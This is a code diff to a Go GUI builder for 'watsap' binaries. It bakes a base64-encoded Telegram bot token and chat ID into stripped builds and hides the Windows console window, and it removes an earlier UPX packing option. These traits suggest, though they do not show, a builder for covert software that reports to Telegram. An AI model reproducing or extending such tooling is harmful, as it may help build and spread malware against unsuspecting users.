@@ -1,7 +1,9 @@
 package main
 
 import (
+	"encoding/base64"
 	"log"
+	"os"
 	"os/exec"
 	"strings"
 	"sync"
@@ -15,7 +17,7 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func builder(arch string, buildType string, platform string, compressionEnabled bool, compressionLevel string, botToken string, chatID string, output binding.String) {
+func builder(arch string, buildType string, platform string, botToken string, chatID string, output binding.String) {
 	var outputText strings.Builder
 	var mu sync.Mutex
 
@@ -28,82 +30,75 @@ func builder(arch string, buildType string, platform string, compressionEnabled 
 
 	updateOutput("Building...\n")
 
-	var cmd *exec.Cmd
-	var command string
+	// Ensure output directory exists
+	if err := os.MkdirAll("../dist", 0755); err != nil {
+		updateOutput("Failed to create dist directory: " + err.Error() + "\n")
+		return
+	}
+
+	// Base64 encode variables to match config expectation
+	encodedBotToken := base64.StdEncoding.EncodeToString([]byte(botToken))
+	encodedChatID := base64.StdEncoding.EncodeToString([]byte(chatID))
 
 	// Common flags
-	commonFlags := "-X 'watsap/utils/config.DEBUG_STATUS=0' -X 'watsap/utils/config.TG_BOT_TOKEN=" + botToken + "' -X 'watsap/utils/config.TG_CHAT_ID=" + chatID + "'"
+	commonFlags := "-X 'watsap/utils/config.DEBUG_STATUS=0' -X 'watsap/utils/config.TG_BOT_TOKEN=" + encodedBotToken + "' -X 'watsap/utils/config.TG_CHAT_ID=" + encodedChatID + "'"
 	debugFlags := commonFlags
 	releaseFlags := commonFlags + " -w -s"
 	win_releaseFlags := commonFlags + " -w -s -H=windowsgui"
 
-	var build_linux, build_windows string
-
-	if buildType == "Release" {
-		build_linux = "GOOS=linux GOARCH=" + arch + " go build -ldflags '" + releaseFlags + "' -o ../dist/watsap-linux-" + arch + ".bin ."
-		build_windows = "GOOS=windows GOARCH=" + arch + " go build -ldflags '" + win_releaseFlags + "' -o ../dist/watsap-windows-" + arch + ".exe ."
-	} else { // Debug
-		build_linux = "GOOS=linux GOARCH=" + arch + " go build -ldflags '" + debugFlags + "' -o ../dist/watsap-linux-" + arch + "-debug.bin ."
-		build_windows = "GOOS=windows GOARCH=" + arch + " go build -ldflags '" + debugFlags + "' -o ../dist/watsap-windows-" + arch + "-debug.exe ."
+	buildGo := func(goos, goarch, outFile, flags string) error {
+		cmd := exec.Command("go", "build", "-ldflags", flags, "-o", outFile, ".")
+		cmd.Dir = "../watsap"
+		cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS="+goos, "GOARCH="+goarch)
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			updateOutput(string(out) + "\n")
+			return err
+		}
+		updateOutput(string(out) + "\n")
+		return nil
 	}
 
 	// Build Linux
 	if platform == "Linux" || platform == "All" {
 		updateOutput("Building for Linux...\n")
-		command = build_linux
-		cmd = exec.Command("bash", "-c", command)
-		cmd.Dir = "../watsap" // run from watsap directory
-		out, err := cmd.CombinedOutput()
+		var outFile string
+		var flags string
+		if buildType == "Release" {
+			outFile = "../dist/watsap-linux-" + arch + ".bin"
+			flags = releaseFlags
+		} else {
+			outFile = "../dist/watsap-linux-" + arch + "-debug.bin"
+			flags = debugFlags
+		}
+
+		err := buildGo("linux", arch, outFile, flags)
 		if err != nil {
 			updateOutput("Linux build failed: " + err.Error() + "\n")
-			updateOutput(string(out) + "\n")
 		} else {
 			updateOutput("Linux build successful.\n")
-			updateOutput(string(out) + "\n")
 		}
 	}
 
 	// Build Windows
 	if platform == "Windows" || platform == "All" {
 		updateOutput("Building for Windows...\n")
-		command = build_windows
-		cmd = exec.Command("bash", "-c", command)
-		cmd.Dir = "../watsap" // run from watsap directory
-		out, err := cmd.CombinedOutput()
+		var outFile string
+		var flags string
+		if buildType == "Release" {
+			outFile = "../dist/watsap-windows-" + arch + ".exe"
+			flags = win_releaseFlags
+		} else {
+			outFile = "../dist/watsap-windows-" + arch + "-debug.exe"
+			flags = debugFlags
+		}
+
+		err := buildGo("windows", arch, outFile, flags)
 		if err != nil {
 			updateOutput("Windows build failed: " + err.Error() + "\n")
-			updateOutput(string(out) + "\n")
 		} else {
 			updateOutput("Windows build successful.\n")
-			updateOutput(string(out) + "\n")
 		}
-	}
-
-	if buildType == "Release" && compressionEnabled {
-		updateOutput("Compressing binaries...\n")
-		var upxCmd []string
-		if compressionLevel == "ultra-brute" {
-			upxCmd = append(upxCmd, "-9", "-q", "-f", "--ultra-brute", "--no-owner")
-		} else {
-			upxCmd = append(upxCmd, "-"+compressionLevel, "-q", "-f", "--no-owner")
-		}
-
-		if platform == "Windows" || platform == "All" {
-			upxCmd = append(upxCmd, "../dist/watsap-windows-"+arch+".exe")
-		}
-		if platform == "Linux" || platform == "All" {
-			upxCmd = append(upxCmd, "../dist/watsap-linux-"+arch+".bin")
-		}
-
-		cmd = exec.Command("upx", upxCmd...)
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			updateOutput("Compression failed: " + err.Error() + "\n")
-			updateOutput(string(out) + "\n")
-			return
-		}
-		updateOutput("Compression successful.\n")
-		updateOutput(string(out) + "\n")
 	}
 
 	updateOutput("Build complete!")
@@ -127,14 +122,12 @@ A GUI application for building Watsap binaries with custom configurations.
 
 ## Features
 - Cross-platform builds (Linux, Windows)
-- Multiple architectures (amd64, i386, arm64)
+- Multiple architectures (amd64, 386)
 - Build type selection (Release, Debug)
-- Binary compression with UPX
 - Real-time build logs
 
 ## Requirements
 - Go compiler
-- UPX (optional, for compression)
 
 ## Version
 1.0.0
@@ -153,7 +146,7 @@ Built with ♿ using Fyne
 	topBar := container.NewBorder(nil, nil, nil, aboutButton, title)
 
 	arch := "amd64"
-	archRadio := widget.NewRadioGroup([]string{"amd64", "i386", "arm64"}, func(s string) {
+	archRadio := widget.NewRadioGroup([]string{"amd64", "386"}, func(s string) {
 		arch = s
 	})
 	archRadio.Horizontal = true
@@ -178,25 +171,6 @@ Built with ♿ using Fyne
 
 	chatIDEntry := widget.NewEntry()
 	chatIDEntry.SetPlaceHolder("Enter chat ID")
-
-	compressionEnabled := false
-	compressionLevel := "ultra-brute"
-
-	compressionLevelSelect := widget.NewSelect([]string{"1", "2", "3", "4", "5", "6", "7", "8", "9", "ultra-brute"}, func(selected string) {
-		compressionLevel = selected
-	})
-	compressionLevelSelect.SetSelected("ultra-brute")
-	compressionLevelSelect.Disable()
-
-	compressionCheck := widget.NewCheck("Enable Compression", func(checked bool) {
-		compressionEnabled = checked
-		if checked {
-			compressionLevelSelect.Enable()
-		} else {
-			compressionLevelSelect.Disable()
-		}
-	})
-
 	logBinding := binding.NewString()
 	logBinding.Set("Build logs will appear here.")
 	logOutput := widget.NewRichTextFromMarkdown("")
@@ -230,7 +204,7 @@ Built with ♿ using Fyne
 			return
 		}
 
-		go builder(arch, buildType, platform, compressionEnabled, compressionLevel, botTokenEntry.Text, chatIDEntry.Text, logBinding)
+		go builder(arch, buildType, platform, botTokenEntry.Text, chatIDEntry.Text, logBinding)
 	})
 	buildButton.Importance = widget.HighImportance
 
@@ -247,8 +221,6 @@ Built with ♿ using Fyne
 			{Text: "Architecture", Widget: archRadio},
 			{Text: "Build Type", Widget: buildTypeRadio},
 			{Text: "Platform", Widget: platformRadio},
-			{Text: "", Widget: compressionCheck},
-			{Text: "Compression Level", Widget: compressionLevelSelect},
 		},
 	}
 
@@ -257,10 +229,6 @@ Built with ♿ using Fyne
 		_, err := exec.LookPath("go")
 		if err != nil {
 			log.Println("Go is not installed. Please install it from https://golang.org/dl/")
-		}
-		_, err = exec.LookPath("upx")
-		if err != nil {
-			log.Println("upx is not installed. Please install it from https://upx.github.io/")
 		}
 	}()
 
